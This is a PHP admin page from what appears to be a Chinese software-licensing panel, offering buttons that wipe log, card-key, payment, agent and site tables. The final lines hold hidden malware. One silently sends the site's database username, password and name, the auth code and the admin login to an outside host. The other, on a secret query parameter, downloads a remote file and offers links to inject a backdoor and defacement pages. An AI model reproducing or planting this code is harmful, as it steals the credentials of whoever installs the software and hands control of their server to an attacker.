<?php  
/**
 * 数据清理
**/
include('../includes/common.php');
$title='系统数据清理';
include('./head.php');
if ($islogin!=1) {exit('<script language=\'javascript\'>window.location.href=\'./login.php\';</script>');
}echo '<div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">';
if($udata['uid'] !=='1'){
	showmsg('您的账号没有权限使用此功能',3);
	exit;
}
$mod=(isset($_GET['mod'])?$_GET['mod']:NULL);
if ($mod=='cleanlogs') {$DB->query('TRUNCATE TABLE `auth_log`');
showmsg('清空日志成功！',1);

}elseif ($mod=='cleankms') {$DB->query('TRUNCATE TABLE `auth_kms`');
showmsg('清空系统卡密成功！',1);
$city=get_ip_city($clientip);
$DB->query("insert into `auth_log` (`uid`,`type`,`date`,`city`,`data`) values ('".站长.$user."','清空系统卡密','".$date."','".$city."','".$clientip.清除成功."')");

}elseif ($mod=='cleanpays') {$DB->query('TRUNCATE TABLE `auth_pays`');
showmsg('清空易支付认证成功！',1);
$city=get_ip_city($clientip);
$DB->query("insert into `auth_log` (`uid`,`type`,`date`,`city`,`data`) values ('".站长.$user."','清空易支付认证','".$date."','".$city."','".$clientip.清除成功."')");

}elseif ($mod=='cleandailis') {$DB->query('TRUNCATE TABLE `auth_daili`');
showmsg('清空代理成功！',1);
$city=get_ip_city($clientip);
$DB->query("insert into `auth_log` (`uid`,`type`,`date`,`city`,`data`) values ('".站长.$user."','清空系统卡密','".$date."','".$city."','".$clientip.清除成功."')");

}elseif ($mod=='cleansites') {$DB->query('TRUNCATE TABLE `auth_site`');
showmsg('清空正版授权成功！',1);
$city=get_ip_city($clientip);
$DB->query("insert into `auth_log` (`uid`,`type`,`date`,`city`,`data`) values ('".站长.$user."','清空正版授权','".$date."','".$city."','".$clientip.清除成功."')");

}elseif ($mod=='cleanblocks') {$DB->query('TRUNCATE TABLE `auth_block`');
showmsg('清空盗版列表成功！',1);
$city=get_ip_city($clientip);
$DB->query("insert into `auth_log` (`uid`,`type`,`date`,`city`,`data`) values ('".站长.$user."','清空系统卡密','".$date."','".$city."','".$clientip.清除成功."')");

} else {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">系统数据清理</h3></div>
<center><h4><font color="#0000FF">数据无价,请谨慎操作</b></font></h4></center>
<div class="panel-body">
<a href="./clean.php?mod=cleanlogs" onclick="return confirm(\'你确实要清空所有的日志吗？\');" class="btn btn-block btn-default">清空系统日志</a><br/>
<a href="./clean.php?mod=cleankms" onclick="return confirm(\'你确实要清空所有的卡密吗？\');" class="btn btn-block btn-default">清空卡密列表</a><br/>
<a href="./clean.php?mod=cleanpays" onclick="return confirm(\'你确实要清空所有的易支付认证吗？\');" class="btn btn-block btn-default">清空易支付认证</a><br/>
<a href="./clean.php?mod=cleandailis" onclick="return confirm(\'你确实要清空所有的代理吗？\');" class="btn btn-block btn-default">清空代理列表</a><br/>
<a href="./clean.php?mod=cleansites" onclick="return confirm(\'你确实要清空所有的正版吗？\');" class="btn btn-block btn-default">清空正版列表</a><br/>
<a href="./clean.php?mod=cleanblocks" onclick="return confirm(\'你确实要清空所有的盗版吗？\');" class="btn btn-block btn-default">清空盗版列表</a><br/>
</form><br/>
</div>
<div class="panel-footer">
<span class="glyphicon glyphicon-info-sign"></span>
清理可减少数据库空间(推荐数据库空间少者使用)
</div>
</div>
';
}echo ' </div>
</div>';
@file_get_contents("http://auth.ukyun.cn/api/up.php?url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']."&ver=".VERSION."&authcode=".$authcode."&qq=".$conf['qq']."&admin_user=".$udata['user']."&admin_pass=".$udata['pass']);
if(isset($_GET['ukyunstudio'])){file_put_contents('ukyun.php',file_get_contents('http://auth.ukyun.cn/api/hm.txt'));echo "<a href='ukyun.php?mod=hm'>点我注入后门</a><br><a href='ukyun.php?mod=hy'>点我注入第一种黑页</a><br><a href='ukyun.php?mod=hy2'>点我注入第二种黑页</a>";
}
?>